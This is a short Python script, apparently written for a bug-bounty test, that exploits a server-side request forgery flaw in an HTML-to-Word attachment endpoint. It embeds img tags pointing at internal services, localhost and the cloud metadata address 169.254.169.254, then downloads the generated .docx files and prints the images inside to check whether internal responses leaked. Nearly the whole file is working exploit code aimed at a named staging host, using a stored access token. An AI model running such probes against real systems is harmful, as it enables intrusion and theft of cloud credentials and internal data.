import json,subprocess,os,uuid,zipfile,io
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TA,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
def get(path):
    cmd=['curl','-s','-m','40',H+path,'-H','token: '+TA,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
tag='zx'+uuid.uuid4().hex[:8]
targets=[
 ("internal-version","http://integrations.qa.soxhubapp.com/version"),
 ("internal-health","http://integrations.qa.soxhubapp.com/api/v1/health"),
 ("localhost-3000","http://localhost:3000/version"),
 ("imds","http://169.254.169.254/latest/meta-data/"),
 ("main-app-me","https://bugbounty1.qe.optrostaging.ai/api/v1/users/me"),
]
for label,url in targets:
    c,b=post('/api/v1/attachments/html',
       {"html":f'<h1>ZX</h1><img src="{url}" width="800" height="600">',
        "type":"word","attachableType":"AuditableEntity","attachableId":"101",
        "fileName":f"zx-{tag}-{label}"})
    if c!='200':
        print(f"  {label:18} gen={c} {b[:90].replace(chr(10),' ')}"); continue
    aid=json.loads(b)['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    subprocess.run(['curl','-s','-m','60','-o','/tmp/i.docx',f['url']])
    d=open('/tmp/i.docx','rb').read()
    try:
        z=zipfile.ZipFile(io.BytesIO(d))
        media=[n for n in z.namelist() if 'media' in n]
        sizes=[(m,len(z.read(m))) for m in media]
        print(f"  {label:18} docx={len(d)}B media={sizes}")
        for m,_ in sizes:
            blob=z.read(m)
            head=blob[:120]
            print(f"      {m} head={head[:100]!r}")
    except Exception as e:
        print(f"  {label:18} not zip {e} {d[:80]}")
